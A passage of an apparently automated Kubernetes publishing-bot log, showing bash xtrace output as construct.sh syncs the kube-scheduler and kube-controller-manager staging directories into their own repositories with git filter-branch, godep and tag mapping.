a0ae31695b456bef5c4ee1597afd9934e8b9b019..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\t+ '[' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 '!=' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tFixing up godeps after a complete sync\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/kube-scheduler\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kube-scheduler/\") or . == \"k8s.io/kube-scheduler\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream-branch' --first-parent\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream-branch --ancestry-path\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local k_last_kube_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apimachinery-master\n>\t+ '[' -z cdac837abb323d610ee074068a16915651f888dd ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd'\n>\t+ git checkout -q cdac837abb323d610ee074068a16915651f888dd\n>\tChecking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=apiserver\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apiserver-master\n>\t+ '[' -z 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5 ']'\n>\t+ pushd ../apiserver\n>\tChecking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ echo 'Checking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5'\n>\t+ git checkout -q 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\tRemove redundant godep commits on-top of 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2.\n>\t+ echo 'Remove redundant godep commits on-top of 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2.'\n>\t+ git reset --soft -q 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-scheduler\n>\t+ local repo=kube-scheduler\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '2cb7fac Merge pull request #68195 from luxas/consolidate_componentconfig_code_standards' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-scheduler-master.sh --dependencies apimachinery:master,apiserver:master --mapping-output-file '../tag-kube-scheduler-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 because \"kubernetes-1.10.0-alpha.0\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 '!=' 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Oct 18 08:17 UTC]: Successfully constructed master\n>[09 Oct 18 08:17 UTC]: /publish_scripts/construct.sh kube-scheduler release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-scheduler\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tFetching from origin.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tCleaning up checkout.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 2cb7fac8b79fc8f17eb286a6b0738cd0dd4764b2\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' 243557ba3da96995db4f8efbc756fc935d074739 '!=' 243557ba3da96995db4f8efbc756fc935d074739 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-scheduler-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 --mapping-output-file '../tag-kube-scheduler-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at f79e0b4b33a9f995cdc1beff2e5225bb771be606 because \"kubernetes-1.11.0-alpha.1\" seems to be relevant.\n>\t++ git rev-parse release-1.12\n>\t+ '[' f79e0b4b33a9f995cdc1beff2e5225bb771be606 '!=' f79e0b4b33a9f995cdc1beff2e5225bb771be606 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Oct 18 08:17 UTC]: Successfully constructed release-1.12\n>[09 Oct 18 08:17 UTC]: Successfully ensured /go-workspace/src/k8s.io/kube-controller-manager exists\n>[09 Oct 18 08:17 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Oct 18 08:17 UTC]: /publish_scripts/construct.sh kube-controller-manager master master apimachinery:master,apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-controller-manager kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-controller-manager\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 7585de142f540d0e0fc5c986d4e3aea354ff97c3\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f9acfd8e384488d2216b18196152dcb7b3cc92d8\n>\t+ '[' f9acfd8e384488d2216b18196152dcb7b3cc92d8 '!=' a34123d9c3e933b662bf0a3cb2c427f774154b01 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''a34123d9c3e933b662bf0a3cb2c427f774154b01'\\'' to '\\''f9acfd8e384488d2216b18196152dcb7b3cc92d8'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'a34123d9c3e933b662bf0a3cb2c427f774154b01' to 'f9acfd8e384488d2216b18196152dcb7b3cc92d8'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kube-controller-manager master master apimachinery:master,apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kube-controller-manager\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3.\n>\t+ echo 'Starting at existing master commit 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.\n>\t+ echo 'Checked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream/master --ancestry-path\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local k_base_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t+ git branch -f filtered-branch-base a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/kube-controller-manager.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/kube-controller-manager.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kube-controller-manager 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kube-controller-manager\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\tRunning git filter-branch ...\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kube-controller-manager -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=efc2db79585412fcbbce0126d91bab430e6cba0c\n>\t++ git log --first-parent --format=%H --reverse efc2db79585412fcbbce0126d91bab430e6cba0c..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3 '!=' 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local 